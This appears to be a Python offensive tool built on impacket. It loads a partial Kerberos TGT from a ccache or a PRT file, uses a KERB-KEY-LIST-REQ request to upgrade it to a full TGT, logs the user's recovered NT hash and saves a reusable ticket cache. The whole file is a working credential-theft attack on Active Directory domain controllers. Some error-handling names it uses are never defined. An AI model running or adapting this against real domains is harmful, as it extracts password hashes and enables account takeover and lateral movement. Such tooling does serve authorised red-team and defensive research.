#!/usr/bin/env python
import argparse
import datetime
import logging
import random
import re
import os
import codecs
import json
import base64
import sys
from binascii import unhexlify, hexlify

from pyasn1.type.univ import noValue, SequenceOf, Integer
from pyasn1.codec.der import encoder, decoder

from impacket import version
from impacket.krb5.ccache import CCache

from impacket.examples import logger
from impacket.examples.utils import parse_credentials
from impacket.krb5 import constants
from impacket.krb5.asn1 import AP_REQ, AS_REP, TGS_REQ, Authenticator, TGS_REP, seq_set, seq_set_iter, PA_FOR_USER_ENC, \
    EncTicketPart, AD_IF_RELEVANT, Ticket as TicketAsn1, EncTGSRepPart, KERB_KEY_LIST_REP, EncASRepPart
from impacket.krb5.crypto import Key, _enctype_table, _HMACMD5, Enctype
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive
from impacket.krb5.types import Principal, KerberosTime, Ticket

def load_from_prt(prtfile):
    with codecs.open(prtfile,'r', 'utf-8') as prtfile:
        data = json.load(prtfile)
    ticketdata = json.loads(data['tgt_ad'])
    ticketbin = base64.b64decode(ticketdata['messageBuffer'])
    try:
        sessionkey = unhexlify(data['tgt_ad_sessionkey'])
    except KeyError:
        sessionkey = base64.b64decode(ticketdata['clientKey'])
    asRep = decoder.decode(ticketbin, asn1Spec=AS_REP())[0]

    cipher = _enctype_table[18]
    key = Key(18, sessionkey)
    cipherText = asRep['enc-part']['cipher']
    tgt = ticketbin
    try:
        plainText = cipher.decrypt(key, 3, cipherText)
    except InvalidChecksum as e:
        # probably bad password if preauth is disabled
        if preAuth is False:
            error_msg = "failed to decrypt session key: %s" % str(e)
            raise SessionKeyDecryptionError(error_msg, asRep, cipher, key, cipherText)
        raise
    encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
    # print(encASRepPart)

    cipher = _enctype_table[encASRepPart['key']['keytype']]
    sessionKey = Key(cipher.enctype,encASRepPart['key']['keyvalue'].asOctets())
    return tgt, cipher, sessionKey

    

class TGTUpgrader(object):

    def __init__(self, username, domain, options):
        self.__username = username
        self.__domain = domain.upper()
        self.__kdcHost = options.dc_ip

    def upgrade(self, prtfile=None):
        if prtfile:
            tgt, cipher, sessionKey = load_from_prt(prtfile)
            logging.info('Using TGT from PRT file')
        else:
            # Do we have a TGT cached?
            tgt = None
            try:
                ccache = CCache.loadFile(os.getenv('KRB5CCNAME'))
                logging.debug("Using Kerberos Cache: %s" % os.getenv('KRB5CCNAME'))
                principal = 'krbtgt/%s@%s' % (self.__domain.upper(), self.__domain.upper())
                creds = ccache.getCredential(principal)
                if creds is not None:
                    # ToDo: Check this TGT belogns to the right principal
                    TGT = creds.toTGT()
                    tgt, cipher, sessionKey = TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey']
                    oldSessionKey = sessionKey
                    logging.info('Using TGT from cache')
                else:
                    logging.debug("No valid credentials found in cache. ")
            except:
                logging.critical('No TGT found from ccache, did you set the KRB5CCNAME environment variable?')

        decodedTGT = decoder.decode(tgt, asn1Spec = AS_REP())[0]

        # Extract the ticket from the TGT
        ticket = Ticket()
        ticket.from_asn1(decodedTGT['ticket'])

        apReq = AP_REQ()
        apReq['pvno'] = 5
        apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)

        opts = list()
        apReq['ap-options'] =  constants.encodeFlags(opts)
        seq_set(apReq,'ticket', ticket.to_asn1)

        authenticator = Authenticator()
        authenticator['authenticator-vno'] = 5
        authenticator['crealm'] = str(decodedTGT['crealm'])

        clientName = Principal()
        clientName.from_asn1( decodedTGT, 'crealm', 'cname')

        seq_set(authenticator, 'cname', clientName.components_to_asn1)

        now = datetime.datetime.utcnow()
        authenticator['cusec'] = now.microsecond
        authenticator['ctime'] = KerberosTime.to_asn1(now)

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('AUTHENTICATOR')
            print(authenticator.prettyPrint())
            print ('\n')

        encodedAuthenticator = encoder.encode(authenticator)

        # Key Usage 7
        # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
        # TGS authenticator subkey), encrypted with the TGS session
        # key (Section 5.5.1)
        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)

        apReq['authenticator'] = noValue
        apReq['authenticator']['etype'] = cipher.enctype
        apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

        encodedApReq = encoder.encode(apReq)

        tgsReq = TGS_REQ()

        tgsReq['pvno'] =  5
        tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)

        tgsReq['padata'] = noValue
        tgsReq['padata'][0] = noValue
        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
        tgsReq['padata'][0]['padata-value'] = encodedApReq

        tgsReq['padata'][1] = noValue
        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.KERB_KEY_LIST_REQ.value)
        encodedKeyReq = encoder.encode([23], asn1Spec=SequenceOf(componentType=Integer()))
        tgsReq['padata'][1]['padata-value'] = encodedKeyReq

        reqBody = seq_set(tgsReq, 'req-body')

        opts = list()
        opts.append( constants.KDCOptions.forwardable.value )
        opts.append( constants.KDCOptions.renewable.value )
        opts.append( constants.KDCOptions.canonicalize.value )

        reqBody['kdc-options'] = constants.encodeFlags(opts)

        serverName = Principal(self.__username, type=constants.PrincipalNameType.NT_UNKNOWN.value)

        serverName = Principal("krbtgt", type=constants.PrincipalNameType.NT_SRV_INST.value)
        reqBody['sname']['name-type'] = constants.PrincipalNameType.NT_SRV_INST.value
        reqBody['sname']['name-string'][0] = serverName
        reqBody['sname']['name-string'][1] = str(decodedTGT['crealm'])
        reqBody['realm'] = str(decodedTGT['crealm'])

        now = datetime.datetime.utcnow() + datetime.timedelta(days=1)

        reqBody['till'] = KerberosTime.to_asn1(now)
        reqBody['nonce'] = random.getrandbits(31)
        seq_set_iter(reqBody, 'etype',
                      (int(cipher.enctype),int(constants.EncryptionTypes.rc4_hmac.value)))

        myTicket = ticket.to_asn1(TicketAsn1())

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('Final TGS')
            print(tgsReq.prettyPrint())

        message = encoder.encode(tgsReq)
            
        logging.info('Upgrading to full TGT with NT hash recovery')

        tgsr = sendReceive(message, self.__domain, self.__kdcHost)

        tgs = decoder.decode(tgsr, asn1Spec = TGS_REP())[0]

        if logging.getLogger().level == logging.DEBUG:
            logging.debug('TGS_REP')
            print(tgs.prettyPrint())

        cipherText = tgs['ticket']['enc-part']['cipher']

        newCipher = _enctype_table[int(tgs['ticket']['enc-part']['etype'])]

        encTGSRepPart = tgs['enc-part']
        enctype = encTGSRepPart['etype']
        cipher = _enctype_table[enctype]

        decryptedTGSRepPart = cipher.decrypt(sessionKey, 8, encTGSRepPart['cipher'])
        decodedTGSRepPart = decoder.decode(decryptedTGSRepPart, asn1Spec=EncTGSRepPart())[0]
        encPaData1 = decodedTGSRepPart['encrypted_pa_data'][0]
        decodedPaData1 = decoder.decode(encPaData1['padata-value'], asn1Spec=KERB_KEY_LIST_REP())[0]
        key = decodedPaData1[0]['keyvalue'].prettyPrint()
        
        logging.info('Recovered NT hash:')
        logging.info(key[2:])

        logging.info(f'Saving TGT to {self.__username}.ccache')
        ccache = CCache()

        ccache.fromTGS(tgsr, sessionKey, sessionKey)
        ccache.saveFile(f'{self.__username}.ccache')

# Process command-line arguments.
if __name__ == '__main__':
    logger.init()

    parser = argparse.ArgumentParser()

    parser.add_argument('identity', action='store', help='domain/username')
    parser.add_argument('-f', '--prt-file', action='store',metavar = "PRT file",  help='PRT file to extract ticket from instead of taking it from a ccache')
    parser.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                       'ommited it use the domain part (FQDN) specified in the target parameter')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    domain, username, password = parse_credentials(options.identity)


    if domain is None:
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    upgrader = TGTUpgrader(username, domain, options)
    upgrader.upgrade(options.prt_file)
